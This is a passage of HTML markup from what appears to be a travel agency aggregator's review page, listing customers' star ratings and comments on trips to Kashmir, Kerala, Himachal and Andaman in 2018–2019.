                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Mar 2019</small></h5>
                      <p style="margin:0px;">Overall good trip.  hotels, driver very good.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Kavita Bhatkar  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;5th, Mar 2019</small></h5>
                      <p style="margin:0px;">We had an amazing time in kerala and an excellent trip. All the hotels and places were so good. We enjoyed a lot. Our driver was very helpful and friendly throughout the journey. Thanks for such a wonderful experience and we hope to travel with you in future also. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sujee  for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Feb 2019</small></h5>
                      <p style="margin:0px;">Nice trip with this agent</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Suman Naga for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Feb 2019</small></h5>
                      <p style="margin:0px;">Very good hospitality ,soft spoken and was very helpful  through out the Andaman trip.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Vishwas   for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Feb 2019</small></h5>
                      <p style="margin:0px;">Jabbar Travels is one of the best I have ever seen... Thanks miss fauzia for her heart touching hospitality and care. Also thanks to abid bhai for his familiar treatment. Fauzia thank you so much. Jabbar Travels I always recommend you every one  for Kashmir tour...you all are so good specialy Fauzia and abid. Thanks vishwas </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Magesh K for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;23rd, Feb 2019</small></h5>
                      <p style="margin:0px;">Better</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ashutosh tripathi  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Feb 2019</small></h5>
                      <p style="margin:0px;">Best services and good staff , </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Wasim Quraishi  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Feb 2019</small></h5>
                      <p style="margin:0px;">We traveled to Kashmir a week ago. Tour was organised by Jabbar tours and travels. Kashmir is a heaven in earth. We had a pleasent trip and enjoyed a lot kashmirâ€™s beautiful nature and snowfall also. The staff of Jabbar travel were so helpful on trip and guided us very well. They booked good hotels and food stuffs for us. With the help of staff we also bought some items from Kashmir in a cheap range. There polite behaviour and helpful nature was really appreciating. Book Jabbar travel as your your travel organiser if you want a pleasent tour.<br />
        Lots of good wishes for them.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from varshan  for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;10th, Feb 2019</small></h5>
                      <p style="margin:0px;">V Good Service</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Prajesh  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;9th, Feb 2019</small></h5>
                      <p style="margin:0px;">We had a very pleasant trip in Kashmir. We had opted for Jabbar travels as our travel partner. The arrangement was very well organized. They are set up in Kashmir. Hence, they understand the place very well. Our representative from Jabbar, Ms. Fouzia made sure everything from day one to the end of the trip went smooth and enjoyable. She often called to check if we faced any difficulties during the trip, which was satifying. Please continue the good job. I would recommend Jabbar Travels to anybody, anytime. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Raki Sahu  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;8th, Feb 2019</small></h5>
                      <p style="margin:0px;">Awesome treatment given by Chrison Holidays.. Thanks to Mr Jose Sir.. And the driver Abu... </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Akhil  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Feb 2019</small></h5>
                      <p style="margin:0px;">Superb experience ...covered all the trip ...<br />
    Thank you for providing the good hotels and rooms and also superb vies from the hotels. And mainly Driver was awesome shared all the things and guided us all the things in the trip (chotu)</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ritesh goyal  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Feb 2019</small></h5>
                      <p style="margin:0px;">The agent was personable, delightful, and veritable fountains of information</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rama Sharma  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Jan 2019</small></h5>
                      <p style="margin:0px;">Under budget good trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from samir  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, Jan 2019</small></h5>
                      <p style="margin:0px;">Nice trip...enjoyed with all the arrangements made by Honor tour and travels ..Nice people and vehicle  also good...overall great experience with family. Thank you Honor tour and travels....</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shah Ankur y  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Jan 2019</small></h5>
                      <p style="margin:0px;">Nice agents ,also I get nice hotels and nice food ,all are very comparative and good service </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ajinkya Patil  for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;13th, Jan 2019</small></h5>
                      <p style="margin:0px;">Tour was good till day 2<br />
    Also after cyclone came on day 3 proper arrangements were made for accommodation.<br />
    <br />
    Only one thing I regreted in the trip was focus was not given on customer expectations from trip.<br />
    <br />
    I had booked honeymoon package and had to remind for candle light dinner each day.<br />
    On the last day they told they cannot provide and will refund.<br />
    <br />
    Overall trip was good .</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Manika   for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;11th, Jan 2019</small></h5>
                      <p style="margin:0px;">I had a great time wid travel setu diksha doing her job vry nicely she is every time available thanks for travel setu to make my b'day special. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rajesh  for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;10th, Jan 2019</small></h5>
                      <p style="margin:0px;">Good service</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from VISHAL AGRAWAL  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;9th, Jan 2019</small></h5>
                      <p style="margin:0px;">JABBAR TRAVELS TEAM IS VERY GOOD AND EXCELLENT ...........................AND ALWAYS READY TO SUPPORT DURING YOUR TRIP...............IN FUTURE I WILL HAPPY TO CHOSE JABBAR TRAVEL FOR MY TRIPS  .........................</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Amit pandiya  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;8th, Jan 2019</small></h5>
                      <p style="margin:0px;">Extremely happy with the service and the people around,fully enjoy the adventures trip of this year.<br />
    Thanks honor tour and travels team for creating such a eye capture memorable moments.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Garish  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;6th, Jan 2019</small></h5>
                      <p style="margin:0px;">Fabulous tour with Jabbar Tour & Travels<br />
    We have just reached from Kashmir (Pahalgam, Gulnarg& Srinagar) by Jabbar Travels with many happy memories. First we want to thank Miss Fozia ( staff member of Jabbar team) for organizing this family trip for us. Jabbar is the best travel agency as the services, planning& time schedule was great. Accommodation was very good, food was tasty& healthy with different choices.bpackage was reasonable & all the team members i.e. cook,drivers,room service, co-ordinators were excellent & hassle free. Drivers were well mannered and friendly.we all felt safe & secure during the trip. We once again highly oblized to Miss Fozia for helping us in booking of package by Travel Setu& taking daily telephonic updates twice a day. We really appreciate your kind & helpful possitive behavior from very beginning till the end of this trip.<br />
    God bless you and the team!<br />
    Thanks</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mithilesh Miriyala  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;5th, Jan 2019</small></h5>
                      <p style="margin:0px;">Well designed itinerary. Travel utopia has been responsive and responsible.. And care taking too</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Naimesh  Chunara for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;5th, Jan 2019</small></h5>
                      <p style="margin:0px;">It's very good tour for me</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nilesh Jain  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Jan 2019</small></h5>
                      <p style="margin:0px;">Wonderful trip with travel right holidays. Everything was so well organised during the entire tour. Special mention for owner Mr. Gilkar and his colleague Zainab for regular follow ups and making sure that our trip was comfortable and memorable. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from C Sood  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Dec 2018</small></h5>
                      <p style="margin:0px;">Very nice trip in beginning I was worried about travelsetu site and the local travel operator but after the trip I hope that I will visit kashmir again with honor travel. Hotel was good but driver was very very nice person and guided us very well in our trip.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Bhavya  for Shimla trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Dec 2018</small></h5>
                      <p style="margin:0px;">The driver and the hotel staff was nice and cooperative</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Kuldeep  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;25th, Dec 2018</small></h5>
                      <p style="margin:0px;">I think honour tour travel is good travel agency. Everyone should give a chance to honour.it is amazing .</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Swapnil  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;25th, Dec 2018</small></h5>
                      <p style="margin:0px;">Nicely arranged</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Srivijay  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Dec 2018</small></h5>
                      <p style="margin:0px;">Travel plans was good. Well Organized for transportation. Hotel room was as expected.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rubiya  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Dec 2018</small></h5>
                      <p style="margin:0px;">FEEL SAFE AND GO AHEAD TO KASHMIR WITHUT ANY FEAR ..... REGARDS </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Annapoorani  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, Dec 2018</small></h5>
                      <p style="margin:0px;">To start with.. We just approached honor tours and travels for getting a competitive quote... but by seeing the quick response we got from Baiza...!!! She made us to book it with them....!!! within a short span of time they planned our trip very well... !! The plus point of them is... they plan the trip as if they are planning their own trip....!!! they made sure we are comfortable from the moment we reached Srinagar till we reached home....!!! The entire team.. treated us like a family...!! From the stay.. food.. the places they suggested for us to visit... everything were just perfect...!!! They made the trip most memorable one....!!!! It was nice meeting your entire team before leaving Srinagar....!!!!<br />
    <br />
    Three Cheers to the young and energetic team...!!!! All the best guys....!!! Keep rocking....!!!!  </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Udaykiran  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Dec 2018</small></h5>
                      <p style="margin:0px;">Hotels exactly as described in the itinerary, food in wood bine (manali ) not up to standards expected of it, but the stay and view from it is amazing, I repeat "amazing"</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sudhanshu  Bhatt for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Dec 2018</small></h5>
                      <p style="margin:0px;">Travel and Time comes with high regard, they were able to put together a wonderful trip to Himachal for us and we are so exceptionally cheerful about it. We would like to tell everyone how nice everything was and how well planned it was as well. They took the time to make sure the details were perfect and that is very rare in this day and age. Well done team Travel and Time and we will travel with you guys again indeed!...Always happy with you.....and sure I suggest my friends and family members .....</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sudhanshu  Bhatt for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Dec 2018</small></h5>
                      <p style="margin:0px;">Fantastic Trip wonderful .... I have visited a lot of places in India so I wanted to explore more destinations but I was not really sure about which places to cover. I'm so glad to choose Travel and Time for my Himachal trip. It was so amazing and relaxing. Manali is really beautiful and their availability 24/7 helped us too. The resort we stayed in was more than our expectations that too at so reasonable prices. It was the best trip till date, looking forward to more.... Wow....</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ankit verma  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Dec 2018</small></h5>
                      <p style="margin:0px;">Everything is jst awesome staffs are well behaved and cab driver too service is also good inshot our trip is jst amazing.<br />
    Thanks global tour holidays</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from RITURAJ  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;13th, Dec 2018</small></h5>
                      <p style="margin:0px;">One word to describe the trip managed by Him Travels "awesome".<br />
    All promises made by them were fulfilled by 110%. During our entire trip , everything went so smooth.<br />
    They helped us  plan our trip right from the start and managed everything for us at very reasonable cost.<br />
    They were always available for all our queries and helped us create a memorable visit to DevBhoomi Himachal.<br />
    Special mention to our cab driver ,Chaman Bhaiya . Throughout the trips and road journey we had a friendlier person to accompany in his form and he guided us to each and every thing which we could have seen , enjoyed and taken back with us.<br />
    Thank you HimTravels , you made our trip a memorable one .<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Vijayan  for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;4th, Dec 2018</small></h5>
                      <p style="margin:0px;">ok</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Hemant   for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Nov 2018</small></h5>
                      <p style="margin:0px;">It was  awesome  trip  and we had  fantastic  time in Kashmir.  The  hospitality  of kasmiris  was  very appreaciable.  Coordinator biaza  makes wonderful trip  plan. The Kashmir is must  visit place  fearlessly. In few  places  less <br />
    variety for vegetarian  food .<br />
    But  overall thanks  to honor  group.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from prashant  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, Nov 2018</small></h5>
                      <p style="margin:0px;">Manager is very co-operative. He care our very small thing's.The Arranged hotel's were very luxurious.the driver babubhai is well known about all tourists places. Thanks for a fantastic tour</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from charmi mehta  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, Nov 2018</small></h5>
                      <p style="margin:0px;">EXCELLENT--BEST HOTELS--AND BEST SERVICE...THANKS  TO TOURIST TRIANGLE......</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nagarajuna  for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, Nov 2018</small></h5>
                      <p style="margin:0px;">Good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mahesh Gohil  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, Nov 2018</small></h5>
                      <p style="margin:0px;">The arrangement made by  Worthful Moments Travels Private Limited , is excellent . All the Hotels are good the food arrangement also excellent. The Madam Miss. from Worthful Moments was very co-operative and always under contact with us every time. She had made sure that we do not face any difficulty in our Trip.  I will 100% suggest that Worthful moments travel are very Genuine and worthful for your  money.<br />
    <br />
     My only feedback to people is if you going to Karela make sure that you select the driver with Hindi or English speaking and understanding .. As we have face little difficulty in this. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nikhil   for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Nov 2018</small></h5>
                      <p style="margin:0px;">Very nice and memorable trip. Well organized and all location properly covered. All hotels booked at proper location.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Vivek Namdeo  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Nov 2018</small></h5>
                      <p style="margin:0px;">#honor tours n travels..very humble and cooperative.. arrangement was very nice n comfortable.thank u mr sajid and miss baiza for such a memorable trip of Kashmir..I m recommended to everyone plzzz do call for honor tours n Travels for make ur trip memorable.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Abir Bhattacharyya  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Nov 2018</small></h5>
                      <p style="margin:0px;">Excellent trip... They were treating us as a family member only.. Pretty professional and Completed all the commitment as per quotation. Hope we will meet again.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from harsh patel  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Nov 2018</small></h5>
                      <p style="margin:0px;">I am so happy with my trip. Thanks to Travelsetu as well as My Trip My Way specially to Hiteshbhai of My Trip My Way. We happy to their services</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Vivek shankar  for South-India trip.</h3>
                      <h5 class="name" style="margin:0px;">
